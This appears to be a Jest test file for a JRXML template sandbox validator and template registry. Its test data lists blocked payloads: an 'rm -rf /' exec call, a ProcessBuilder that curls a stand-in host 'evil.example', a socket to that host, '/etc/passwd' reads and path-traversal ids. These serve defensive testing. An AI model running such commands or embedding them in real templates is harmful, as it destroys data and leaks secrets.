import { BadRequestException, NotFoundException } from '@nestjs/common'
import { assertJrxmlSandboxSafe, TemplateRegistryService } from './template-registry'

describe('assertJrxmlSandboxSafe', () => {
  it('accepts benign jrxml content', () => {
    expect(() => assertJrxmlSandboxSafe('<jasperReport name="ok"><staticText/></jasperReport>')).not.toThrow()
  })

  it.each([
    'Runtime.getRuntime().exec("rm -rf /")',
    'new java.io.File("/etc/passwd")',
    'java.sql.DriverManager.getConnection(...)',
    'jdbc:postgresql://internal-db/secrets',
    '<queryString><![CDATA[SELECT * FROM users]]></queryString>',
    'System.exit(1)',
    'new ProcessBuilder("sh", "-c", "curl evil.example")',
    'java.net.Socket("evil.example", 80)',
    'new URLConnection()',
    'HttpURLConnection conn = ...',
  ])('rejects forbidden jrxml content: %s', forbidden => {
    expect(() => assertJrxmlSandboxSafe(`<jasperReport>${forbidden}</jasperReport>`)).toThrow(BadRequestException)
  })

  it('rejects oversized template content', () => {
    const oversized = 'a'.repeat(300 * 1024)
    expect(() => assertJrxmlSandboxSafe(oversized)).toThrow(BadRequestException)
  })
})

describe('TemplateRegistryService', () => {
  const registry = new TemplateRegistryService()

  it('rejects a template id containing path traversal characters', () => {
    expect(() => registry.resolve('../../etc/passwd')).toThrow(BadRequestException)
    expect(() => registry.resolve('..%2f..%2fetc%2fpasswd')).toThrow(BadRequestException)
    expect(() => registry.resolve('sales/../../secret')).toThrow(BadRequestException)
    expect(() => registry.resolve('/etc/passwd')).toThrow(BadRequestException)
  })

  it('rejects a template id with characters outside the safe slug pattern', () => {
    expect(() => registry.resolve('Sales Report')).toThrow(BadRequestException)
    expect(() => registry.resolve('sales_report')).toThrow(BadRequestException)
    expect(() => registry.resolve('')).toThrow(BadRequestException)
  })

  it('reports a controlled NotFoundException for an unknown (but well-formed) template id', () => {
    expect(() => registry.resolve('sales-report')).toThrow(NotFoundException)
  })

  it('has() reflects allowlist membership without throwing', () => {
    expect(registry.has('sales-report')).toBe(false)
    expect(registry.has('../escape')).toBe(false)
  })

  it('resolves the "sample-report" templateId that both the API and the renderer allowlist (TASK-022.5-R1)', () => {
    // Same templateId, same file (apps/api/.../templates/sample-report.jrxml is a copy of
    // services/jasper-renderer/.../templates/sample-report.jrxml) — the renderer independently
    // allowlists and compiles this exact id in its own TemplateRegistry.
    expect(registry.has('sample-report')).toBe(true)

    const resolved = registry.resolve('sample-report')

    expect(resolved.id).toBe('sample-report')
    expect(resolved.content).toContain('name="sample-report"')
  })
})
